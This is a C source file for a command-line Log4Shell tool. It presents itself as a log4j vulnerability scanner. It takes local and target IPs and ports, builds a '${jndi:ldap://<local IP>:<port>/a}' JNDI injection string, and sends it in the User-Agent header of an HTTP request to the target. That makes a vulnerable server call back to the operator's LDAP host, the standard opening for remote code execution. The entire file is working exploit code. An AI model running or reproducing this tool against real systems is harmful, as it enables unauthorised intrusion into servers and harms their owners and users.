#include "libpop2/httpprotocol.h"
#include <stdio.h>
#include "libpop2/required/intrinsic.h"
#include "libpop2/required/nix.h"
#include "libpop2/required/memory.h"
#include "libpop2/required/platform.h"
#include "libpop2/required/assert.h"
#include "libpop2/bucket.h"
#include "libpop2/marray.h"
#include "libpop2/stringz.h"

void Exploit(s32* localIP, s32* targetIP, int portNumber, int targetPort);
s32* SendPayload(s32* localIP, s32* targetIP, int portNumber, int targetPort);
s32 *GetHostStringName(s32* localIP);
s32* CreatePayload(s32* targetIP, int listenPort);

void ShowHelp()
{
	printf("Usage: -l <LOCAL IP> -p <LOCAL PORT> -t <TARGET IP> -tp <TARGET PORT> \n");
	printf("Scans a target for log4j vulnerability.\n\n");
	printf("Mandatory arguments:\n");
	printf("\t-t\t Target ip/host (use)\n");
	printf("\t-tp\t Target port\n");
	printf("\t-l\t Local ip <Your ip>\n");
	printf("\t-p\t port to listen to\n");
}

int main(int argc, char* argv[])
{
	s32 *targetIP = NULL;
	i32 targetPort = NULL;
	s32 *localIP = NULL;
	i32 portNumber= 0;


	for (int i = 0; i < argc; i++)
	{
		s32 *option = (char*) *(argv + i);

		if (StrCmp(option, "-l"))
		{
			if (i + 1 < argc)
			{
				localIP = (char*) *(argv + i + 1);
			}
		}
		if (StrCmp(option, "-t"))
		{
			if (i + 1 < argc)
			{
				targetIP = (char*) *(argv + i + 1);
			}
		} else
		if (StrCmp(option, "-tp"))
		{

			if (i + 1 < argc)
			{
				s32 *portNumberString = (char*) *(argv + i + 1);
				targetPort = SToI(portNumberString);
			}
   
		} else

		if (StrCmp(option, "-p"))
		{

			if (i + 1 < argc)
			{
				s32 *portNumberString = (char*) *(argv + i + 1);
				portNumber = SToI(portNumberString);
			}
   
		} else
		if (StrCmp(option, "-h"))
		{
			ShowHelp();	
		}
	}

	if (localIP && targetIP && portNumber > 1 && targetPort > 1)
	{
		printf("Target IP: %s\n", targetIP);
		printf("Target Port: %i\n", targetPort);
		printf("Local IP: %s\n", localIP);
		printf("Local port: %i\n\n", portNumber);
		Exploit(localIP, targetIP, portNumber, targetPort);
	} else {
		ShowHelp();	
	}

	MemoryResults();

}

void Exploit(s32* localIP, s32* targetIP, int portNumber, int targetPort)
{
	s32 * payloadResult = NULL;

	payloadResult = SendPayload(localIP, targetIP, portNumber, targetPort);
}

s32* SendPayload(s32* localIP, s32* targetIP, int portNumber, int targetPort)
{
	struct bucket_list headers  = {};
	s32 *httpResult = NULL;
	s32 *hostName = NULL;
	
	InitBucket(&headers,256,0);

	hostName = GetHostStringName(targetIP);

	if (hostName)
	{
		s32 *payload =  NULL;

		printf("Creating payload\n");
		payload = CreatePayload(localIP, portNumber);

		printf("Sending payload:\n");
		if (payload)
		{
			AddS32ToBucket(&headers, "Host", hostName);
			AddS32ToBucket(&headers, "User-Agent", payload);
			AddS32ToBucket(&headers, "Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
			AddS32ToBucket(&headers, "Accept-Language", "en-US,en;q=0.5");
			AddS32ToBucket(&headers, "Connection", "close");

			httpResult = HttpRequest(targetIP, &headers, GET, NULL, targetPort);

			if (httpResult)
			{
			}

			Free(payload);
			payload = NULL;
		}

		printf("Payload: Sent\n");
		Free(hostName);
		hostName = NULL;
	} else {
		printf("Couldn't extract hostname\n");
	}

	if (httpResult)
	{
		Free(httpResult);
		httpResult = NULL;
	}

	FreeAllBuckets(&headers);

	printf("Done!\n");
}

s32 *GetHostStringName(s32* localIP)
{
	s32 *httpString = NULL;

	httpString = S32Replace(localIP, "https://","");

	if (StrCmp(httpString, localIP))
	{
		if (httpString)
		{
			Free(httpString);
			httpString = NULL;
		}
		httpString = S32Replace(localIP, "http://","");
	}

	return httpString;
}

s32* CreatePayload(s32* targetIP, int listenPort)
{
	s32 *result = NULL;
	s32 *listenPortString = NULL;

	listenPortString = IToS(listenPort);

	result = CS32Cat(5,"${jndi:ldap://",targetIP,":",listenPortString, "/a}");

	if (listenPortString)
	{
		Free(listenPortString);
		listenPortString = NULL;
	}

	return result;
}
